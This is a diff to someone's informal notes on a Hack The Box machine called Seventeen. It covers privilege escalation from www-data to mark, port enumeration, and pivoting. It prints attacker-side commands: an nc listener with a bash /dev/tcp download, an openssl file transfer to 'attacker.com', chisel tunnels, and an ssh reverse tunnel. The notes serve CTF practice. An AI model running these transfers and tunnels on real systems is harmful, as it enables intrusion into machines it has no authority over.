@@ -262,6 +262,8 @@ To find the process/dbh.php
 `mark : 2020bestyearofmylife`
 ![](userdottextmark.png)
 
+## PrivEsc - www-data to Mark
+
 This is an awesome little 
 ```bash
 find / -user $user -ls 2>/dev/null
@@ -271,13 +273,19 @@ find / -user $user -ls 2>/dev/null
 With permissions listed
 ![](withperms.png)
 
-## PrivEsc
+## PrivEsc - Mark to Kavi
 
+The email that the data we may need would be stored by some auxillary service to the simple web UI that stores staff data that will probably used to PrivEsc. 
 ![](loggertheregistry.png)
+Importantly - there is serverside code completed for data handling - but problem exist with the:
+- Private registry
+- Logger - various version may exist.
+- Mike,v Kavishka
+
 
 Ippsec discusses how the 8000 does to a load balancer, which I had tried to use a a reverse shell, but also why it came up with a 403 forbiudden in the nmap scan
 ![](portsandsensemaking.png)
-Because Ippsec saying that 4873 does not make sense to him I decide to go through all the ports, dorking the port I did not know 
+Because Ippsec saying that 4873 does not make sense to him I decide to go through all the ports, dorking the port I did not know. Also decided just to rescan as I have done multiple port scans as is OSCP ready recon normality. Good reminder. 
 53 - DNS
 80 - http
 8000 - http
@@ -286,13 +294,67 @@ UDP 68 - DHCP/Bootstrap Protocol Client
 [Bootstrap protocol client. Used by client machines to obtain dynamic IP addressing information from a DHCP server.](https://www.speedguide.net/port.php?port=68)Apple NetBoot also uses this port.
 110 - Pop3
 143 - IMAP 
+![](unofficialports6000to6009.png)
+JDNet does have register - and ERP is enterprise resource planning...
+
+993 - IMAP over TLS
+995 - Pop3 over TLS
+3306 -MySQL
 
 ```bash
 ~C
 -L 488
 ```
 
-[Paused video to continue this for last two and half hours I can justify atm](https://www.youtube.com/watch?v=U-2nI6wSPOE&t=1632s)
+[Paused video to continue this for last two and half hours I can justify these days](https://www.youtube.com/watch?v=U-2nI6wSPOE&t=1632s). So from deduction  the reason that 4873 is a weird port is it not a 5 digit port and it is mostly likely an in-house usage as it not third party vendor official port or standard unix service port.  
+
+Therefore port forwarding. I want to do this both with chisel and with ssh before I check how Ippsec does it. 
+
+- If we domain or network joined what ports are exposed to localhost, but not remotehost?
+	- Are there in-house usage of non-standard ports?
+		- Port Redirection, Networking and Network Security considerations?
+			- Avaliable services for redirection or can you drop a binary like Chisel?
+
+File transfers for you brain and mine the openssl file transfer is hilariously good as everything requires opensll 
+```bash
+# scp oh hi Mark...
+scp chisel mark@seventeen.htb:/tmp/chisel
+
+# use bash subshell to cat on local box into a local path with /dev/tcp while hosting the file with: 
+nc -lvnp 80 < chisel
+# target machine:
+bash -c "cat < /dev/tcp/10.10.14.109/80 > /tmp/chisel"
+
+# My continued nememsis openssl
+# Create key and server to host a $file
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < $file_to_send
+# Victim 
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
+```
+
+I just gave AA for everything, but it would be more secure OPSEC or scope or objective reasons to consider what you information to you generate with the key.
+![](stickachiselinmarkseye.png)
+There is also a recent [opensll Vulnerability](https://sysdig.com/blog/openssl-3-vulnerability-container-images/), regardless the openssl gtfobin was kill multi birds with one stone Beyond Root and goals that I missed in previos CTFs self made challenges. Made me feel more comfortable with encrypted Socat in later CTFs
+
+Tried using just manual rather than my cheatsheets just practice memorising port redirection concept for Azure virtual networking, OSCP related and long good life. 
+```bash
+# Host 
+chisel server -host 127.0.0.1 -port $serverPort
+# Seveenteen.htb
+chisel client -fingerprint $fingerprint 4873:127.0.0.1:$listenerPOrt$:10.10.14.109:$Serverport
+```
+I then ran into the upsetting revalations the I have not finished and there by mined [[Reddish-Helped-through]]... it is now on the complete ASAP list, so hopefully before the end of Janaury 2023. Regardless, I learnt openssl lolbas file transfering, plus more happy with openssl after 7 plus month head butting it for various reason in HTB boxes. Sadly I turned off the chisel server.
+
+From my note on ssh port forwarding without using the ssh subshell ~C
+```bash
+# Syntax: ssh -N -R [bind_address:]port:host:hostport [username@address]
+ssh -N -R $Attacker_IP:$Listening_port:$remotes_127-0-0-1:$port_forwarded_through attacker@$Attacker_IP
+```
+
 
 ## Beyond Root
 
